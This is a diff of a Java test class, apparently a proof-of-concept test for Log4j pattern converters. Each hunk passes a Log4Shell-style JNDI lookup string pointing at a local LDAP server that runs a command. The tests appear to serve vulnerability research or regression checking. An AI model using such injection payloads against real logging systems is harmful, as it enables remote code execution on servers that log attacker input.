@@ -16,7 +16,7 @@ public class PatternConvertersPocTests {
         Configuration configuration = new DefaultConfiguration();
         MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration, new String[]{"lookups"});
         LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
-        messagePatternConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
+        messagePatternConverter.format(logEvent, new StringBuilder());
     }
 
     @Test
@@ -24,7 +24,7 @@ public class PatternConvertersPocTests {
         DefaultConfiguration configuration = new DefaultConfiguration();
         LogEventPatternConverter converter = MessagePatternConverter.newInstance(configuration, new String[]{"lookups"});
         LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
-        converter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
+        converter.format(logEvent, new StringBuilder());
     }
 
     @Test
@@ -44,7 +44,7 @@ public class PatternConvertersPocTests {
     public void formatLiteralPatternConverterTest() {
         Configuration configuration = new DefaultConfiguration();
         LiteralPatternConverter literalConverter = new LiteralPatternConverter(configuration, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false);
-        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
+        LogEvent logEvent = new MutableLogEvent(new StringBuilder(), null);
         literalConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
     }
 
